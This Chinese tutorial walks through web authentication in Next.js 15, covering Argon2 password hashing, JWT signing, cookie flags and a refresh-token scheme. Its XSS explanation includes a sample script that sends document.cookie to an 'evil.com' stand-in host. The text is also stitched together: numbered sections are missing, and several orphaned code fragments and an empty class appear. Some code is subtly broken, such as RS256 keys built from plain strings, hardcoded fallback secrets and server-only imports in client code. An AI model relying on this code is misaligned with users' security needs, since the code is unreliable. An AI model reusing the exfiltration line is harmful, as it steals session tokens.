## 一、密码安全：为什么"密码+盐"还不够？

### 1.1 先说个故事：为什么不能直接存密码？

你开了一家网站，把用户的密码直接存进数据库：

```sql
-- 千万别这么做！
CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50)  -- 直接存明文密码！
);
```

这下完蛋了——如果哪天数据库被黑，所有用户的密码全都泄露。用户可能在N个网站都用同一个密码，黑客拿着这些密码去撞库，后果不堪设想。

所以密码绝对不能明文存储。但怎么存才安全？这就要从密码哈希说起了。

### 1.2 什么是哈希？为什么要用它？

**哈希（Hash）**就像把一篇文章扔进碎纸机，出来的碎片根本看不出原来写的是什么。但只要你用同样的碎纸机处理同样的文章，出来的碎片永远是一样的。

哈希函数就是"数字世界的碎纸机"：

- 输入任意长度的内容
- 输出固定长度的"乱码"
- 正向计算很快，但反向推导几乎不可能

但光有哈希还不够。假设你和隔壁老王都用了同一个哈希函数，你们的密码碰巧都是"123456"，那哈希后的结果也一模一样。黑客看到两个人哈希值相同，就知道你们密码一样了。

### 1.3 加盐：从"一道菜"变成"每个人专属的菜"

**加盐（Salted Hash）**的思路很简单：哈希之前，给每个用户的密码加点"私料"。

```typescript
// 简单示例：密码 + 随机盐值
const salt = generateRandomSalt() // 比如 "x7#k9@m2"
const hash = sha256(password + salt) // 123456 + x7#k9@m2 = 一堆乱码
```

这样即使用户密码相同，由于盐值不同，最终的哈希结果也完全不同。黑客想破解？得每个用户单独算一遍，成本大大提高。

### 1.4 密码哈希算法的进化史

#### 1.4.1 第一代：MD5 + 盐（90年代，已淘汰）

```sql
-- 每个用户一个随机盐值，单独存储
CREATE TABLE users (
  id INT PRIMARY KEY,
  username VARCHAR(50),
  password_hash VARCHAR(32),  -- MD5输出固定32个字符
  salt VARCHAR(16)             -- 盐值单独存
);
```

MD5的问题是：**太快了！**

现在的显卡（GPU）每秒能计算上百亿次MD5哈希。黑客可以：

1. 准备一个"常见密码字典"
2. 预先计算所有密码的MD5值（彩虹表）
3. 数据库泄露后，直接查表匹配

所以MD5加盐在今天已经等于不加密。

#### 1.4.2 第二代：bcrypt（2010年代主流）

bcrypt的革命性创新是**故意让计算变慢**：

```typescript
const hash = await bcrypt.hash(password, 12) // 成本因子12

// 输出格式：$2b$12$盐值(22字符)哈希(31字符)
// bcrypt把盐值直接嵌在输出里，不用单独存
```

**bcrypt的优点：**

- 自适应成本：通过"成本因子"控制计算时间
- 内置盐值：盐值直接编码在哈希里
- 抵抗GPU：大量内存访问模式，不适合并行计算

**bcrypt的局限：**

- 主要靠时间成本，对专用硬件（ASIC）防护有限
- 内存使用相对固定，无法灵活调整

#### 1.4.3 第三代：Argon2（2015年密码学奥林匹克冠军）

Argon2是目前最先进的密码哈希算法，2015年赢得了著名的"密码哈希竞赛"。

它的核心思想是**三维度同时加大难度**：

| 参数        | 什么意思   | 为什么有用                     |
| ----------- | ---------- | ------------------------------ |
| memoryCost  | 内存使用量 | GPU/ASIC再强，内存带宽也是瓶颈 |
| timeCost    | 迭代次数   | 多算几遍，时间成本翻倍         |
| parallelism | 并行度     | 限制了并行计算的能力           |

```typescript
import { hash, verify, argon2id } from 'argon2'

async function hashPassword(password: string): Promise<string> {
	return await hash(password, {
		type: argon2id, // 混合模式，平衡安全性和性能
		memoryCost: 65536, // 64MB内存使用
		timeCost: 3, // 迭代3次
		parallelism: 4, // 4个线程并行
		hashLength: 32, // 输出32字节
	})
}
```

**Argon2的三种模式：**

- `argon2d`：最大程度抵抗GPU，但可能受侧信道攻击
- `argon2i`：专门抵抗侧信道攻击，但对GPU防护较弱
- `argon2id`（**推荐**）：前两者的混合，日常生活用这个就够了

#### 1.4.4 进化总结对比

| 特性       | MD5+盐   | bcrypt       | Argon2           |
| ---------- | -------- | ------------ | ---------------- |
| 诞生年代   | 1990s    | 1999         | 2015             |
| 安全理念   | 快速哈希 | 时间成本     | 内存+时间成本    |
| 抗GPU能力  | 极弱     | 中等         | 强               |
| 抗ASIC能力 | 无       | 有限         | 强               |
| 参数调优   | 固定     | 时间成本     | 时间+内存+并行度 |
| 现代推荐   | 禁止使用 | 可用但非最佳 | 首选             |

### 1.5 生产环境怎么选？

**新项目**：直接用Argon2，不用犹豫。

**已有bcrypt系统**：迁移不是必须的，但新功能应该用Argon2。bcrypt本身也没有被破解，只是Argon2更好。

**关键原则**：成本参数要足够高（用户能接受的范围内越慢越好），定期评估硬件进步对安全的影响。

## 二、会话管理：JWT到底是个什么鬼？

### 2.1 不用JWT的话，登录状态怎么存？

假设你做了一个网站，用户登录后，你怎么告诉服务器"这个请求是张三发的"？

**方案一：存Session**

服务器给每个登录用户分配一个会话ID，存在内存或数据库里：

```
用户登录 → 服务器分配Session ID = "abc123" → 返回给浏览器
后续请求 → 浏览器带着Session ID → 服务器查表确认身份
```

问题：每台服务器都要存Session，多台服务器就麻烦了（要用共享Session存储）。

**方案二：JWT（JSON Web Token）**

JWT的思路是：**别存了，我自己带身份信息！**

```
用户登录 → 服务器签发一个"Token" → 返回给浏览器
后续请求 → 浏览器带着Token → 服务器验证Token真伪
```

Token里包含用户信息，服务器只需要验证签名就能确认身份，完全不用查表。

### 2.2 JWT长什么样？

一个JWT长这样（拆成三段，用点号隔开）：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJuYW1lIjoi5byg5LiJIn0.d1a2b3c4d5e6f7g8h9i0
↑ Header（头部）                  ↑ Payload（载荷）              ↑ Signature（签名）
```

- **Header**：记录用什么算法签名
- **Payload**：存放用户信息（不加密！只是Base64编码）
- **Signature**：用密钥对前两段签名，确保没人伪造

> 小知识：Payload里的内容只是Base64编码，不是加密。所以别往JWT里放敏感信息（比如密码），那等于明文！

### 2.3 JWT的算法选择：HS256还是RS256？

JWT支持两种签名算法：

**对称算法（HS256）**：

- 用同一个密钥签名和验证
- 速度快，适合单服务
- **问题**：客户端也能用这个密钥验证JWT，密钥泄露风险大

**非对称算法（RS256）**：

- 用私钥签名，用公钥验证
- 私钥服务端藏着，公钥可以发给任何人
- 更安全，适合分布式系统

```typescript
import { jwtVerify, SignJWT } from 'jose'

class AuthService {
	// 生成Token
	async generateToken(payload: any): Promise<string> {
		return await new SignJWT(payload)
			.setProtectedHeader({ alg: 'RS256' }) // 必须明确指定算法
			.setIssuedAt() // 签发时间
			.setExpirationTime('7d') // 7天后过期
			.sign(privateKey) // 用私钥签名
	}

	// 验证Token
	async verifyToken(token: string): Promise<any> {
		try {
			const { payload } = await jwtVerify(token, publicKey) // 用公钥验证
			return payload
		} catch (error) {
			return null // 验证失败
		}
	}
}
```

### 2.4 JWT的三个缺点，你必须知道

JWT听起来很美，但有三个坑：

1. **Token泄露怎么办？**
   - 一旦Token被偷，黑客就能用它访问系统
   - 服务器没法主动让Token失效（除非用黑名单）
   - 解决方案：短期Token + 刷新机制

2. **Token越来越大怎么办？**
   - Payload虽然不加密，但也不应该太大
   - 每次请求都带着整个Token，网络开销不小
   - 解决方案：只存必要信息，别什么都往里塞

3. **Token怎么撤销？**
   - JWT设计理念是"无状态"，但实际总需要撤销能力
   - 解决方案：刷新令牌 + 黑名单 或 Redis存已撤销的jti

## 三、Cookie策略：HttpOnly与SameSite的组合拳

### 3.1 JWT怎么传给服务器？

服务器签发了JWT，但浏览器怎么在后续请求里把JWT送回去？

**方案一：存在Cookie里**（我们用的方案）
**方案二：存在LocalStorage，通过Authorization头传递**

两种方案各有优缺点：

| 方案         | 优点                        | 缺点                         |
| ------------ | --------------------------- | ---------------------------- |
| Cookie       | 自动发送，配合HttpOnly防XSS | 受CSRF攻击威胁               |
| LocalStorage | 不受CSRF攻击                | 需要手动在每次请求时加Header |

### 3.2 为什么要用HttpOnly？

XSS（跨站脚本攻击）是Web安全的大敌。黑客在你的网站注入一段JavaScript代码，读取用户的Cookie，然后发到自己的服务器。

```html
<!-- 恶意评论里藏着这段代码 -->
<script>
	// 读取Cookie里的Token
	const token = document.cookie
	// 发到黑客的服务器
	fetch('https://evil.com/steal?cookie=' + token)
</script>
```

HttpOnly的作用：让JavaScript根本读不到这个Cookie！

```typescript
cookieStore.set('token', jwtToken, {
	httpOnly: true, // 加了这个，JavaScript就读不到了
	secure: true, // 只在HTTPS下发送
	sameSite: 'strict', // 防止CSRF
	maxAge: 7 * 24 * 60 * 60, // 7天有效期
	path: '/',
})
```

### 3.3 为什么要用SameSite？

CSRF（跨站请求伪造）又是什么？想象一下：

1. 你登录了银行网站，但没有退出
2. 你顺手点了一封邮件里的链接
3. 这个链接实际上向银行发送了一个转账请求
4. 浏览器自动带上Cookie，银行以为是你的合法请求

SameSite就是来解决这个的：

| 值       | 行为                        | 说明             |
| -------- | --------------------------- | ---------------- |
| `strict` | 只在同站点请求时带Cookie    | 最安全，但体验差 |
| `lax`    | 同站请求 + 导航请求带Cookie | 平衡安全和使用   |
| `none`   | 任何请求都带                | 需要配合Secure   |

**`sameSite: 'strict'`是最安全的**，但如果你从外部链接点进来，由于是"导航请求"，Cookie不会带，可能导致用户刚登录又显示未登录。所以很多网站用`lax`。

### 3.4 Cookie配置的完整示例

```typescript
import { cookies } from 'next/headers'

async function login(name: string, password: string) {
	// ...验证逻辑...

	// 签发JWT
	const token = await authService.generateToken({
		userId: user.id,
		name: user.name,
	})

	// 设置Cookie - Next.js 15需要await
	const cookieStore = await cookies()

	cookieStore.set('auth_token', token, {
		httpOnly: true, // 防止XSS读取
		secure: process.env.NODE_ENV === 'production', // 生产环境必须HTTPS
		sameSite: 'lax', // 防止CSRF，但允许导航请求
		maxAge: 60 * 60 * 24 * 7, // 7天有效期（秒）
		path: '/', // 全站生效
	})
}
```

## 四、完整实现：从注册到退出的闭环

### 4.1 用户注册：安全的起点

注册是用户进入系统的第一道门，要把好关：

```typescript
import { hash, verify, argon2id } from 'argon2'
import { z } from 'zod'

// 先定义输入验证规则
const registerSchema = z.object({
	name: z
		.string()
		.min(2, '用户名至少2个字符')
		.max(50, '用户名最多50个字符')
		.regex(/^[a-zA-Z0-9_]+$/, '用户名只能包含字母、数字、下划线'),
	password: z
		.string()
		.min(8, '密码至少8个字符')
		.max(128, '密码最长128个字符')
		.regex(/[A-Z]/, '密码必须包含大写字母')
		.regex(/[a-z]/, '密码必须包含小写字母')
		.regex(/[0-9]/, '密码必须包含数字'),
})

class AuthService {
	/**
	 * 注册新用户
	 */
	async register(name: string, password: string): Promise<IDataResult<boolean>> {
		try {
			// 1. 输入验证
			const validationResult = registerSchema.safeParse({ name, password })
			if (!validationResult.success) {
				return {
					code: -1,
					message: validationResult.error.errors[0].message,
					data: false,
				}
			}

			// 2. 检查用户名是否已存在
			const existingUser = await this.prisma.user.findFirst({
				where: { name },
			})

			if (existingUser) {
				return {
					code: -1,
					message: '用户名已被占用',
					data: false,
				}
			}

			// 3. 用Argon2生成安全的密码哈希
			const hashedPassword = await hash(password, {
				type: argon2id,
				memoryCost: 65536, // 64MB
				timeCost: 3, // 3次迭代
				parallelism: 4, // 4线程
				hashLength: 32,
			})

			// 4. 创建用户记录
			await this.prisma.user.create({
				data: {
					name,
					password: hashedPassword, // 只存哈希，不存明文！
				},
			})

			return {
				code: 0,
				message: '注册成功',
				data: true,
			}
		} catch (error) {
			console.error('注册失败:', error)
			return {
				code: -1,
				message: '注册失败，请稍后重试',
				data: false,
			}
		}
	}
}
```

### 4.2 用户登录：三要素验证

登录流程要验证三件事：

```typescript
class AuthService {
	/**
	 * 用户登录
	 */
	async login(name: string, password: string): Promise<IDataResult<LoginResult>> {
		try {
			// 1. 查找用户
			const user = await this.prisma.user.findFirst({
				where: { name },
			})

			if (!user) {
				// 注意：返回模糊的错误信息，防止用户探测
				return {
					code: -1,
					message: '用户名或密码错误',
					data: { user: null },
				}
			}

			// 2. 验证密码（Argon2的verify方法会自动处理盐值）
			const isPasswordValid = await verify(user.password, password)

			if (!isPasswordValid) {
				return {
					code: -1,
					message: '用户名或密码错误',
					data: { user: null },
				}
			}

			// 3. 生成JWT
			const token = await this.generateToken({
				userId: user.id,
				name: user.name,
			})

			// 4. 设置Cookie
			const cookieStore = await cookies()
			cookieStore.set('auth_token', token, {
				httpOnly: true,
				secure: process.env.NODE_ENV === 'production',
				sameSite: 'lax',
				maxAge: 60 * 60 * 24 * 7, // 7天
				path: '/',
			})

			return {
				code: 0,
				message: '登录成功',
				data: {
					user: {
						id: user.id,
						name: user.name,
					},
				},
			}
		} catch (error) {
			console.error('登录失败:', error)
			return {
				code: -1,
				message: '登录失败，请稍后重试',
				data: { user: null },
			}
		}
	}
}
```

> 小提示：为什么错误信息要写成"用户名或密码错误"而不是单独提示哪个错？因为如果分开提示，黑客就能知道哪个用户名已注册，方便他们"踩点"。

### 4.3 会话检查：获取当前用户

```typescript
class AuthService {
	/**
	 * 获取当前登录用户信息
	 */
	async getCurrentUser(): Promise<JWTPayload | null> {
		try {
			const cookieStore = await cookies()
			const token = cookieStore.get('auth_token')

			if (!token) {
				return null
			}

			return await this.verifyToken(token.value)
		} catch (error) {
			console.error('获取当前用户失败:', error)
			return null
		}
	}

	/**
	 * 检查是否已登录
	 */
	async isAuthenticated(): Promise<boolean> {
		const user = await this.getCurrentUser()
		return user !== null
	}
}
```

```typescript
class AuthService {

			}
		}
	}
}
```

## 五、Next.js 15适配：Server Actions的优雅封装

### 5.1 Server Actions的限制与应对

Next.js 15的Server Actions有一个限制：**只能导出函数，不能导出类或实例**。

这并不意味着你要放弃面向对象的设计——我们可以在内部用类，对外暴露函数：

```typescript
// lib/auth-actions.ts
import { AuthService } from './auth-service'

// 内部创建服务实例
const authService = new AuthService()

/**
 * 注册用户
 */
export async function register(formData: FormData) {
	const name = formData.get('name') as string
	const password = formData.get('password') as string

	return await authService.register(name, password)
}

/**
 * 登录用户
 */
export async function login(formData: FormData) {
	const name = formData.get('name') as string
	const password = formData.get('password') as string

	return await authService.login(name, password)
}

/**
 * 退出登录
 */
export async function logout() {
	return await authService.logout()
}

/**
 * 检查登录状态
 */
export async function checkAuth() {
	return await authService.isAuthenticated()
}
```

```typescript
		checkAuthStatus()
	}, [checkAuthStatus])

		user,
		loading,
		isAuthenticated: user !== null,
		refreshAuth,
	}
}
```

## 八、刷新令牌：生产环境的必备机制

### 8.1 单纯JWT的问题

现在我们的JWT有效期是7天。但这里有个矛盾：

- **Token太短**：用户每隔15分钟就要重新登录，体验很差
- **Token太长**：万一Token泄露，黑客有充足的时间搞破坏

刷新令牌机制完美解决了这个矛盾：

```
┌─────────────────────────────────────────────────────────────────┐
│                         刷新令牌流程                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Access Token（短期）          Refresh Token（长期）             │
│  ├─ 有效期：15分钟             ├─ 有效期：7天                    │
│  ├─ 用于API访问                ├─ 用于获取新的Access Token        │
│  ├─ 泄露后攻击窗口小            ├─ 泄露后可以撤销                  │
│  └─ 可以频繁轮换                └─ 不频繁使用，减少暴露风险         │
│                                                                  │
│  用户操作流程：                                                   │
│  1. 登录 → 返回Access Token + Refresh Token                      │
│  2. 用Access Token访问API                                        │
│  3. Access Token快过期 → 用Refresh Token换新的                   │
│  4. Refresh Token也快过期 → 再换新的                             │
│  5. 用户长期不用 → Refresh Token过期，重新登录                    │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2 三种设计方案的权衡

#### 方案一：有状态刷新令牌

把Refresh Token存进数据库：

```prisma
model RefreshToken {
  id        String   @id @default(cuid())
  token     String   @unique
  userId    String
  user      User     @relation(...)
  expiresAt DateTime
  createdAt DateTime @default(now())
  revoked   Boolean  @default(false)
}
```

**优点**：

- 可以随时撤销单个Token
- 支持多设备管理
- 可以记录使用日志

**缺点**：

- 需要数据库存储
- 违背了JWT的无状态理念

#### 方案二：无状态Refresh Token

把Refresh Token也做成JWT：

```typescript
async function generateRefreshToken(userId: string): Promise<string> {
	return await new SignJWT({ userId, type: 'refresh' })
		.setProtectedHeader({ alg: 'RS256' })
		.setExpirationTime('7d')
		.sign(refreshTokenPrivateKey) // 用不同的密钥
}
```

**优点**：

- 完全无状态
- 不需要数据库存储
- 实现简单

**缺点**：

- 无法主动撤销
- 泄露后无法立即失效
- 不支持精细的设备管理

#### 方案三：混合方案（最佳选择）

只存Token的元数据（jti），不存完整Token：

```prisma
model RefreshTokenMetadata {
  id        String   @id @default(cuid())
  jti       String   @unique  // JWT ID
  userId    String
  expiresAt DateTime
  revoked   Boolean  @default(false)
}
```

**优点**：

- 可以通过jti撤销Token
- 存储数据量很小（只有元数据）
- 保持了大部分无状态特性

**缺点**：

- 稍微复杂一点

**实际建议**：方案三是最佳平衡选择。新项目直接用这个。

### 8.3 混合方案的完整实现

#### 8.3.2 AuthService完整实现

```typescript
import { SignJWT, jwtVerify, JWTPayload } from 'jose'
import { cookies } from 'next/headers'
import { PrismaClient } from '@prisma/client'

const prisma = new PrismaClient()

// 算法配置
const ACCESS_TOKEN_ALGORITHM = 'RS256'
const REFRESH_TOKEN_ALGORITHM = 'RS256'

// 配置常量
const ACCESS_TOKEN_EXPIRY = '15m' // 15分钟
const REFRESH_TOKEN_EXPIRY = '7d' // 7天

class AuthService {
	private readonly prisma: PrismaClient

	// 密钥（实际应该从环境变量加载）
	private readonly accessTokenPrivateKey: Uint8Array
	private readonly accessTokenPublicKey: Uint8Array
	private readonly refreshTokenPrivateKey: Uint8Array
	private readonly refreshTokenPublicKey: Uint8Array

	constructor() {
		this.prisma = prisma

		// 初始化密钥（实际生产应该从安全的密钥管理系统加载）
		// 这里用字符串转Uint8Array的简化示例
		this.accessTokenPrivateKey = new TextEncoder().encode(process.env.JWT_PRIVATE_KEY || 'access-private-key')
		this.accessTokenPublicKey = new TextEncoder().encode(process.env.JWT_PUBLIC_KEY || 'access-public-key')
		this.refreshTokenPrivateKey = new TextEncoder().encode(process.env.REFRESH_PRIVATE_KEY || 'refresh-private-key')
		this.refreshTokenPublicKey = new TextEncoder().encode(process.env.REFRESH_PUBLIC_KEY || 'refresh-public-key')
	}

	/**
	 * 生成Access Token（短期）
	 */
	async generateAccessToken(payload: { userId: string; name: string }): Promise<string> {
		return await new SignJWT(payload)
			.setProtectedHeader({ alg: ACCESS_TOKEN_ALGORITHM })
			.setIssuedAt()
			.setExpirationTime(ACCESS_TOKEN_EXPIRY)
			.sign(this.accessTokenPrivateKey)
	}

	/**
	 * 生成Refresh Token（JWT格式 + 元数据存储）
	 */
	async generateRefreshToken(userId: string): Promise<string> {
		// 生成唯一的JWT ID
		const jti = crypto.randomUUID()

		// 计算过期时间
		const expiresAt = new Date()
		expiresAt.setDate(expiresAt.getDate() + 7)

		// 存储元数据（只存jti，不存完整的token）
		await this.prisma.refreshTokenMetadata.create({
			data: {
				jti,
				userId,
				expiresAt,
			},
		})

		// 生成JWT格式的Refresh Token
		return await new SignJWT({
			userId,
			jti,
			type: 'refresh',
		})
			.setProtectedHeader({ alg: REFRESH_TOKEN_ALGORITHM })
			.setIssuedAt()
			.setExpirationTime(REFRESH_TOKEN_EXPIRY)
			.setJti(jti)
			.sign(this.refreshTokenPrivateKey)
	}

	/**
	 * 验证Refresh Token
	 */
	async verifyRefreshToken(token: string): Promise<{
		isValid: boolean
		userId?: string
		jti?: string
	}> {
		try {
			// 1. 验证JWT签名和过期时间
			const { payload } = await jwtVerify(token, this.refreshTokenPublicKey, {
				algorithms: [REFRESH_TOKEN_ALGORITHM],
			})

			const { userId, jti, type } = payload as any

			if (type !== 'refresh' || !userId || !jti) {
				return { isValid: false }
			}

			// 2. 检查元数据是否被撤销
			const metadata = await this.prisma.refreshTokenMetadata.findUnique({
				where: { jti },
			})

			if (!metadata) {
				return { isValid: false }
			}

			if (metadata.revoked) {
				return { isValid: false }
			}

			// 3. 检查是否已过期（双重检查）
			if (metadata.expiresAt < new Date()) {
				return { isValid: false }
			}

			return { isValid: true, userId, jti }
		} catch (error) {
			console.error('Refresh Token验证失败:', error)
			return { isValid: false }
		}
	}

	/**
	 * 撤销单个Refresh Token
	 */
	async revokeRefreshToken(jti: string): Promise<void> {
		await this.prisma.refreshTokenMetadata.update({
			where: { jti },
			data: { revoked: true },
		})
	}

	/**
	 * 撤销用户的所有Refresh Token（用于"退出所有设备"）
	 */
	async revokeAllUserRefreshTokens(userId: string): Promise<void> {
		await this.prisma.refreshTokenMetadata.updateMany({
			where: {
				userId,
				revoked: false,
			},
			data: { revoked: true },
		})
	}

	/**
	 * 清理过期的Refresh Token元数据
	 */
	async cleanupExpiredRefreshTokens(): Promise<number> {
		const result = await this.prisma.refreshTokenMetadata.deleteMany({
			where: {
				expiresAt: {
					lt: new Date(),
				},
			},
		})
		return result.count
	}

	/**
	 * 登录（新版，带刷新令牌）
	 */
	async login(name: string, password: string) {
		try {
			// 1. 查找用户
			const user = await this.prisma.user.findUnique({ where: { name } })

			if (!user) {
				return { code: -1, message: '用户名或密码错误' }
			}

			// 2. 验证密码
			const isValid = await verify(user.password, password)
			if (!isValid) {
				return { code: -1, message: '用户名或密码错误' }
			}

			// 3. 生成Access Token和Refresh Token
			const accessToken = await this.generateAccessToken({
				userId: user.id,
				name: user.name,
			})
			const refreshToken = await this.generateRefreshToken(user.id)

			// 4. 设置Cookie
			const cookieStore = await cookies()

			// Access Token：短期，path=/ 全站可用
			cookieStore.set('access_token', accessToken, {
				httpOnly: true,
				secure: process.env.NODE_ENV === 'production',
				sameSite: 'lax',
				maxAge: 15 * 60, // 15分钟
				path: '/',
			})

			// Refresh Token：长期，path=/api/auth/refresh 只在刷新时用
			cookieStore.set('refresh_token', refreshToken, {
				httpOnly: true,
				secure: process.env.NODE_ENV === 'production',
				sameSite: 'lax',
				maxAge: 7 * 24 * 60 * 60, // 7天
				path: '/api/auth/refresh', // 关键：只在刷新接口发送
			})

			return {
				code: 0,
				message: '登录成功',
				data: {
					user: { id: user.id, name: user.name },
				},
			}
		} catch (error) {
			console.error('登录失败:', error)
			return { code: -1, message: '登录失败' }
		}
	}

	/**
	 * 刷新Access Token
	 */
	async refreshAccessToken(): Promise<{
		success: boolean
		accessToken?: string
		error?: string
	}> {
		try {
			const cookieStore = await cookies()
			const refreshToken = cookieStore.get('refresh_token')?.value

			if (!refreshToken) {
				return { success: false, error: '未提供刷新令牌' }
			}

			// 验证Refresh Token
			const verification = await this.verifyRefreshToken(refreshToken)

			if (!verification.isValid || !verification.userId) {
				return { success: false, error: '刷新令牌无效或已过期' }
			}

			// 获取用户信息
			const user = await this.prisma.user.findUnique({
				where: { id: verification.userId },
			})

			if (!user) {
				return { success: false, error: '用户不存在' }
			}

			// 生成新的Access Token
			const newAccessToken = await this.generateAccessToken({
				userId: user.id,
				name: user.name,
			})

			// 设置新的Access Token Cookie
			cookieStore.set('access_token', newAccessToken, {
				httpOnly: true,
				secure: process.env.NODE_ENV === 'production',
				sameSite: 'lax',
				maxAge: 15 * 60,
				path: '/',
			})

			return { success: true, accessToken: newAccessToken }
		} catch (error) {
			console.error('刷新令牌失败:', error)
			return { success: false, error: '刷新失败' }
		}
	}

	/**
	 * 退出登录
	 */
	async logout(): Promise<void> {
		try {
			const cookieStore = await cookies()
			const refreshToken = cookieStore.get('refresh_token')?.value

			// 如果有Refresh Token，撤销它
			if (refreshToken) {
				try {
					const verification = await this.verifyRefreshToken(refreshToken)
					if (verification.jti) {
						await this.revokeRefreshToken(verification.jti)
					}
				} catch {
					// 忽略错误，可能token已过期
				}
			}

			// 清除Cookie
			cookieStore.delete('access_token')
			cookieStore.delete('refresh_token')
		} catch (error) {
			console.error('退出登录失败:', error)
		}
	}

	/**
	 * 获取当前用户
	 */
	async getCurrentUser(): Promise<JWTPayload | null> {
		try {
			const cookieStore = await cookies()
			const accessToken = cookieStore.get('access_token')?.value

			if (!accessToken) {
				return null
			}

			const { payload } = await jwtVerify(accessToken, this.accessTokenPublicKey)
			return payload
		} catch {
			return null
		}
	}
}

export const authService = new AuthService()
```

```typescript
	return NextResponse.json({
		code: 0,
		message: '令牌刷新成功',
	})
}
```

#### 8.3.4 前端自动刷新逻辑

```typescript
// lib/api-client.ts

class ApiClient {
	private isRefreshing = false
	private refreshSubscribers: Array<(token: string) => void> = []

	/**
	 * 订阅刷新成功的回调
	 */
	subscribeTokenRefresh(callback: (token: string) => void) {
		this.refreshSubscribers.push(callback)
	}

	/**
	 * 通知所有订阅者
	 */
	notifyTokenRefresh(newToken: string) {
		this.refreshSubscribers.forEach((callback) => callback(newToken))
		this.refreshSubscribers = []
	}

	/**
	 * 刷新Token
	 */
	private async refreshToken(): Promise<boolean> {
		if (this.isRefreshing) {
			// 已经在刷新中，等待刷新完成
			return new Promise((resolve) => {
				this.subscribeTokenRefresh(() => resolve(true))
			})
		}

		this.isRefreshing = true

		try {
			const response = await fetch('/api/auth/refresh', {
				method: 'POST',
			})

			if (response.ok) {
				this.isRefreshing = false
				this.notifyTokenRefresh('refreshed')
				return true
			}

			// 刷新失败，跳转登录
			window.location.href = '/login'
			return false
		} catch {
			this.isRefreshing = false
			window.location.href = '/login'
			return false
		}
	}

	/**
	 * 发起API请求（带自动刷新）
	 */
	async request<T>(url: string, options: RequestInit = {}): Promise<T> {
		// 获取当前Token
		const accessToken = await this.getAccessToken()

		// 设置请求头
		const headers = {
			'Content-Type': 'application/json',
			...(accessToken && { Authorization: `Bearer ${accessToken}` }),
			...options.headers,
		}

		let response = await fetch(url, {
			...options,
			headers,
		})

		// 如果返回401，尝试刷新
		if (response.status === 401) {
			const refreshSuccess = await this.refreshToken()

			if (refreshSuccess) {
				// 重新获取新Token并重试
				const newToken = await this.getAccessToken()
				response = await fetch(url, {
					...options,
					headers: {
						...headers,
						Authorization: `Bearer ${newToken}`,
					},
				})
			}
		}

		if (!response.ok) {
			throw new Error(`请求失败: ${response.status}`)
		}

		return response.json()
	}

	/**
	 * 获取Access Token
	 */
	private async getAccessToken(): Promise<string | null> {
		const { cookies } = await import('next/headers')
		const cookieStore = await cookies()
		return cookieStore.get('access_token')?.value || null
	}
}

export const apiClient = new ApiClient()
```

### 8.4 刷新令牌的安全优势总结

| 优势           | 说明                                       |
| -------------- | ------------------------------------------ |
| 缩短攻击窗口   | Access Token只有15分钟，黑客能用的时间很短 |
| 可控的会话管理 | 可以随时撤销Refresh Token，强制重新认证    |
| 减少密码输入   | 用户不需要频繁输入密码，体验更好           |

## 九、总结：认证系统设计的核心原则

### 9.1 密码存储

- **永远不要**明文存储密码
- **永远不要**使用MD5
- **推荐使用**Argon2（最佳选择）或bcrypt
- 密码要足够复杂（大小写+数字+特殊字符）
- 用Zod做服务端验证

### 9.2 会话管理

- **推荐使用**JWT作为Token
- 生产环境用**RS256**（非对称算法）
- Token有效期要合理（Access 15分钟，Refresh 7天）
- **必须配合**刷新令牌机制

### 9.3 Cookie安全

- **HttpOnly**：防止XSS读取
- **SameSite**：防止CSRF攻击
- **Secure**：生产环境必须HTTPS

### 9.4 防御措施

- **速率限制**：防止暴力破解
- **审计日志**：记录所有认证事件
- **模糊错误信息**：不告诉攻击者用户名是否存在

### 9.5 架构设计

- 服务端用**面向对象**设计（AuthService类）
- 前端用**自定义Hook**封装状态
- Next.js Server Actions**对外暴露函数**
- 刷新令牌用**混合方案**（元数据存储）

---

安全不是一蹴而就的，是一个持续的过程。好的架构让你在面对新威胁时，只需要添加新的防护逻辑，而不需要推倒重来。
